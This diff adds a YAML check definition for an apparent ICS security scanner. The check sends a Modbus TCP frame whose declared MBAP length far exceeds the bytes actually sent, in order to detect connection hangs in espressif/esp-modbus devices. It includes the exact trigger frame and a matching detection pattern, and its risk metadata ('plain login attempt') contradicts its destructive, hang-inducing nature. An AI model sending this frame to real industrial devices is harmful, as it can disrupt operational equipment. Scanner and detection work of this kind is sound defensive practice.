@@ -1,0 +1,36 @@
+# Ported from a companion fuzzing toolkit:_check_length_starve. Hex verified
+# by running the PoC's own struct.pack helpers (Milestone 3, 2026-08-13), not hand-computed.
+
+check_id: modbus-espmodbus-length-starve
+protocol: modbus
+kind: declarative
+destructive: true
+risk_reason: ["login"]  # plain login attempt, no confirmed lockout risk, no device write (2026-08-29 reclassification)
+disclosure_status: public
+confidence: high
+fingerprint_precondition:
+  vendor: "Espressif Inc."
+  # Same OUI-only-narrows-to-"some-ESP32" caveat as the emelianov checks.
+description: "MBAP length field far exceeds the actual PDU sent (length starvation) hangs the connection — espressif/esp-modbus (assessed by vendor as robustness, not a vulnerability; BBP#582, no CVE)"
+detection_hints:
+  transport: tcp
+  app_protocol: modbus
+  mitre_attack_id: T0814
+  analytic_story: "ICS Denial of Service"
+  narrow:
+    description: "This scanner's own exact trigger frame: an MBAP length field (0x00ff) far exceeding the actual PDU bytes sent"
+    patterns:
+      - context: request
+        bytes: "\\x00\\x01\\x00\\x00\\x00\\xff\\x01\\x03\\x00\\x00\\x00\\x01"
+  broad:
+    description: "No safe broader byte signature applies — the vulnerability is a STRUCTURAL mismatch (declared MBAP length vs. actual bytes present in the segment), not a fixed byte string; the specific over-large length value and PDU contents can vary. Detecting the general class needs a protocol-aware Modbus TCP parser tracking declared-vs-actual length, not content/pcre substring matching"
+    patterns: []
+steps:
+  - send_hex: "0001000000ff010300000001"
+    timeout_s: 5.0
+    on_timeout:
+      status: confirmed
+      description: "connection hung after an MBAP frame claiming a length far larger than the PDU actually sent"
+    default:
+      status: not-applicable
+      description: "target responded — not exhibiting the hang"
